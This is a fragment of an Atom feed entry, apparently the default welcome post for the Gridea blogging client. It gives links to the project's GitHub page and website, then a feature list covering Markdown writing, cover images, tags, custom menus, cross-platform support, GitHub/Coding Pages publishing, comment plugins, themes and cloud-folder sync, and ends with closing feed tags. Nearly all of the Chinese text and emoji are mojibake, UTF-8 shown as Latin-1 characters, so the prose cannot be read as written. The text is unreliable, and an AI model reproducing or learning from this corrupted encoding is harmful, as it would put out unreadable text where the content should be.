<p><a href="https://github.com/getgridea/gridea">Github</a><br>
<a href="https://gridea.dev/">Gridea ä¸»é¡µ</a><br>
<a href="https://fehey.com/">ç¤ºä¾‹ç½‘ç«™</a></p>
<h2 id="ç‰¹æ€§">ç‰¹æ€§ğŸ‘‡</h2>
<p>ğŸ“  ä½ å¯ä»¥ä½¿ç”¨æœ€é…·çš„ <strong>Markdown</strong> è¯­æ³•ï¼Œè¿›è¡Œå¿«é€Ÿåˆ›ä½œ</p>
<p>ğŸŒ‰  ä½ å¯ä»¥ç»™æ–‡ç« é…ä¸Šç²¾ç¾çš„å°é¢å›¾å’Œåœ¨æ–‡ç« ä»»æ„ä½ç½®æ’å…¥å›¾ç‰‡</p>
<p>ğŸ·ï¸  ä½ å¯ä»¥å¯¹æ–‡ç« è¿›è¡Œæ ‡ç­¾åˆ†ç»„</p>
<p>ğŸ“‹  ä½ å¯ä»¥è‡ªå®šä¹‰èœå•ï¼Œç”šè‡³å¯ä»¥åˆ›å»ºå¤–éƒ¨é“¾æ¥èœå•</p>
<p>ğŸ’»  ä½ å¯ä»¥åœ¨ <strong>Windows</strong>ï¼Œ<strong>MacOS</strong> æˆ– <strong>Linux</strong> è®¾å¤‡ä¸Šä½¿ç”¨æ­¤å®¢æˆ·ç«¯</p>
<p>ğŸŒ  ä½ å¯ä»¥ä½¿ç”¨ <strong>ğ–¦ğ—‚ğ—ğ—ğ—ğ–» ğ–¯ğ–ºğ—€ğ–¾ğ—Œ</strong> æˆ– <strong>Coding Pages</strong> å‘ä¸–ç•Œå±•ç¤ºï¼Œæœªæ¥å°†æ”¯æŒæ›´å¤šå¹³å°</p>
<p>ğŸ’¬  ä½ å¯ä»¥è¿›è¡Œç®€å•çš„é…ç½®ï¼Œæ¥å…¥ <a href="https://github.com/gitalk/gitalk">Gitalk</a> æˆ– <a href="https://github.com/SukkaW/DisqusJS">DisqusJS</a> è¯„è®ºç³»ç»Ÿ</p>
<p>ğŸ‡¬ğŸ‡§  ä½ å¯ä»¥ä½¿ç”¨<strong>ä¸­æ–‡ç®€ä½“</strong>æˆ–<strong>è‹±è¯­</strong></p>
<p>ğŸŒ  ä½ å¯ä»¥ä»»æ„ä½¿ç”¨åº”ç”¨å†…é»˜è®¤ä¸»é¢˜æˆ–ä»»æ„ç¬¬ä¸‰æ–¹ä¸»é¢˜ï¼Œå¼ºå¤§çš„ä¸»é¢˜è‡ªå®šä¹‰èƒ½åŠ›</p>
<p>ğŸ–¥  ä½ å¯ä»¥è‡ªå®šä¹‰æºæ–‡ä»¶å¤¹ï¼Œåˆ©ç”¨ OneDriveã€ç™¾åº¦ç½‘ç›˜ã€iCloudã€Dropbox ç­‰è¿›è¡Œå¤šè®¾å¤‡åŒæ­¥</p>
<p>ğŸŒ± å½“ç„¶ <strong>Gridea</strong> è¿˜å¾ˆå¹´è½»ï¼Œæœ‰å¾ˆå¤šä¸è¶³ï¼Œä½†è¯·ç›¸ä¿¡ï¼Œå®ƒä¼šä¸åœå‘å‰ ğŸƒ</p>
<p>æœªæ¥ï¼Œå®ƒä¸€å®šä¼šæˆä¸ºä½ ç¦»ä¸å¼€çš„ä¼™ä¼´</p>
<p>å°½æƒ…å‘æŒ¥ä½ çš„æ‰åå§ï¼</p>
<p>ğŸ˜˜ Enjoy~</p>
]]></content>
    </entry>
</feed>